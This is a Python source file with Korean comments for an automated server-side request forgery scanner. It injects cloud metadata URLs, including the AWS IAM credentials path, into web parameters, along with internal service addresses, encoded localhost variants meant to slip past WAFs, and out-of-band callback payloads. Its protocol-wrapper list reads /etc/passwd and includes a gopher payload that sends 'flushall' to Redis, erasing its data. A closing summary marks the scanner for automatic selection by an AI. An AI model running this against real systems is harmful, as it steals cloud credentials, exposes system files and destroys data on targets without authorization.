"""
SSRF Auto-Scanner — Server-Side Request Forgery 자동화
======================================================
1. URL 파라미터 탐지 (url=, uri=, path=, redirect=, load=, src= ...)
2. 내부망 IP 프로브 (AWS/GCP/Azure 메타데이터 + 내부 IP)
3. 블라인드 SSRF: DNS OOB (interactsh 연동)
4. 프로토콜 래퍼: file://, dict://, gopher://, ftp://
5. Cloudflare/WAF 우회: IP 인코딩, DNS rebinding 힌트
"""
from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable


# ══════════════════════════════════════════════════════════════
# SSRF 민감 URL 파라미터
# ══════════════════════════════════════════════════════════════

SSRF_PARAMS = [
    "url", "uri", "src", "source", "href", "action", "path",
    "dest", "destination", "redirect", "redirect_uri", "return",
    "returnTo", "return_to", "back", "goto", "next", "forward",
    "load", "fetch", "request", "remote", "host", "site",
    "target", "domain", "link", "proxy", "callback", "webhook",
    "image", "img", "file", "document", "resource", "feed",
    # 한국 특화
    "img_url", "file_url", "thumb", "thumbnail", "banner", "icon",
]

# ══════════════════════════════════════════════════════════════
# 내부망 프로브 대상
# ══════════════════════════════════════════════════════════════

INTERNAL_TARGETS = {
    "aws_metadata":     "http://169.254.169.254/latest/meta-data/",
    "aws_iam":          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_user_data":    "http://169.254.169.254/latest/user-data",
    "gcp_metadata":     "http://metadata.google.internal/computeMetadata/v1/",
    "azure_metadata":   "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "local_80":         "http://127.0.0.1/",
    "local_8080":       "http://127.0.0.1:8080/",
    "local_admin":      "http://127.0.0.1/admin/",
    "internal_db":      "http://172.16.0.1:3306/",
    "internal_redis":   "http://127.0.0.1:6379/",
    "internal_elastic": "http://127.0.0.1:9200/_cat/indices",
}

# IP 인코딩 우회 변형 (127.0.0.1)
LOCALHOST_VARIANTS = [
    "127.0.0.1", "localhost", "0", "0.0.0.0",
    "127.1", "127.0.1", "127.000.000.001",
    "2130706433",      # 10진수
    "0x7f000001",      # 16진수
    "0177.0.0.1",      # 8진수
    "::1",             # IPv6
    "[::]",            # IPv6 all
    "①②⑦.0.0.①",   # 유니코드 숫자 (일부 파서)
    "127。0。0。1",    # 일본어 점 (도트 우회)
]

# 프로토콜 래퍼
PROTOCOL_WRAPPERS = {
    "file_passwd":  "file:///etc/passwd",
    "file_win":     "file:///c:/windows/win.ini",
    "dict_info":    "dict://127.0.0.1:6379/info",
    "gopher_redis": "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
    "ftp_local":    "ftp://127.0.0.1:21/",
    "ldap":         "ldap://127.0.0.1/a",
}


@dataclass
class SsrfFinding:
    param: str
    url_used: str
    target: str
    status: int
    body_snippet: str
    confirmed: bool = False
    severity: str = "MEDIUM"
    notes: str = ""


@dataclass
class SsrfReport:
    target_url: str
    params_tested: list[str] = field(default_factory=list)
    findings: list[SsrfFinding] = field(default_factory=list)
    oob_domains: list[str] = field(default_factory=list)


class SsrfScanner:
    """SSRF 자동 스캐너"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, dict | None], tuple[int, str]],
        log_fn: Callable[[str], None] | None = None,
        oob_domain: str = "",  # interactsh 등 OOB 도메인
    ):
        self._req = request_fn
        self.log = log_fn or (lambda s: None)
        self.oob = oob_domain

    def detect_ssrf_params(self, url: str, body: str = "") -> list[str]:
        """URL과 바디에서 SSRF 가능 파라미터 탐지"""
        found: list[str] = []
        all_text = url + " " + body
        for param in SSRF_PARAMS:
            pattern = rf'(?:[?&]|"|\'|,|\s){re.escape(param)}(?:=|":)'
            if re.search(pattern, all_text, re.I):
                found.append(param)
        return found

    def scan_param(self, base_url: str, param: str, method: str = "GET") -> list[SsrfFinding]:
        """단일 파라미터 SSRF 스캔"""
        findings: list[SsrfFinding] = []

        for target_name, internal_url in INTERNAL_TARGETS.items():
            test_url = self._inject_param(base_url, param, internal_url, method)
            status, body = self._req(test_url, method, {}, None)

            # 응답에서 내부망 데이터 증거 탐지
            evidence = self._detect_internal_data(body, target_name)
            if evidence:
                f = SsrfFinding(
                    param=param,
                    url_used=test_url,
                    target=internal_url,
                    status=status,
                    body_snippet=body[:300],
                    confirmed=True,
                    severity="CRITICAL" if "iam" in target_name or "user_data" in target_name else "HIGH",
                    notes=evidence,
                )
                findings.append(f)
                self.log(f"[SSRF!] {param}={internal_url} → {evidence}")

        # 프로토콜 래퍼 테스트
        for proto_name, proto_url in PROTOCOL_WRAPPERS.items():
            test_url = self._inject_param(base_url, param, proto_url, method)
            status, body = self._req(test_url, method, {}, None)
            if status == 200 and len(body) > 20:
                if self._looks_like_internal(body):
                    findings.append(SsrfFinding(
                        param=param,
                        url_used=test_url,
                        target=proto_url,
                        status=status,
                        body_snippet=body[:200],
                        confirmed=True,
                        severity="CRITICAL",
                        notes=f"Protocol wrapper: {proto_name}",
                    ))

        return findings

    def auto_scan(self, url: str, body: str = "", method: str = "GET") -> SsrfReport:
        """전체 SSRF 자동 스캔"""
        report = SsrfReport(target_url=url)
        params = self.detect_ssrf_params(url, body)
        report.params_tested = params

        self.log(f"[SSRF] 탐지된 파라미터: {params}")

        for param in params[:10]:
            findings = self.scan_param(url, param, method)
            report.findings.extend(findings)

        # OOB SSRF (블라인드)
        if self.oob:
            report.oob_domains = self._gen_oob_payloads(url, params)

        self.log(
            f"[SSRF✓] 완료: 파라미터 {len(params)}개 | 발견 {len(report.findings)}개"
        )
        return report

    @staticmethod
    def _inject_param(url: str, param: str, value: str, method: str) -> str:
        encoded = urllib.parse.quote(value, safe="")
        if method == "GET":
            sep = "&" if "?" in url else "?"
            return f"{url}{sep}{param}={encoded}"
        return url

    @staticmethod
    def _detect_internal_data(body: str, target_name: str) -> str:
        """응답에서 내부 데이터 증거 탐지"""
        if "aws" in target_name:
            if re.search(r'ami-id|instance-id|security-credentials|AccessKeyId', body):
                return "AWS metadata exposed"
        if "gcp" in target_name:
            if re.search(r'computeMetadata|serviceAccounts|access_token', body):
                return "GCP metadata exposed"
        if "azure" in target_name:
            if re.search(r'subscriptionId|resourceGroupName|access_token', body):
                return "Azure metadata exposed"
        if "redis" in target_name:
            if re.search(r'\+OK|PONG|\$\d+\r\n', body):
                return "Redis accessible"
        if "elastic" in target_name:
            if re.search(r'"health"|"uuid"|"cluster_name"', body):
                return "Elasticsearch accessible"
        if re.search(r'root:x:|daemon:|/bin/bash', body):
            return "Linux /etc/passwd exposed"
        if re.search(r'\[extensions\]|for 16-bit app|Windows', body):
            return "Windows file exposed"
        return ""

    @staticmethod
    def _looks_like_internal(body: str) -> bool:
        keywords = [
            "root:", "daemon:", "/bin/bash", "localhost",
            "127.0.0.1", "internal", "private",
        ]
        return any(k in body for k in keywords)

    def _gen_oob_payloads(self, url: str, params: list[str]) -> list[str]:
        """OOB SSRF 페이로드 (interactsh)"""
        payloads = []
        for param in params[:3]:
            oob_url = f"http://{param}.{self.oob}/"
            payloads.append(f"{url}&{param}={urllib.parse.quote(oob_url)}")
        return payloads


SSRF_SCANNER_SUMMARY = """
=== SSRF AUTO-SCANNER (AI AUTO-SELECT) ===

Trigger: any URL/URI/redirect/src/load parameter found
Steps:
  [1] detect_ssrf_params(url, body)
  [2] auto_scan → test AWS/GCP/Azure metadata + internal IPs
  [3] Protocol wrappers: file://, gopher://, dict://
  [4] Blind SSRF: oob_domain=<interactsh_domain> for DNS callback
"""
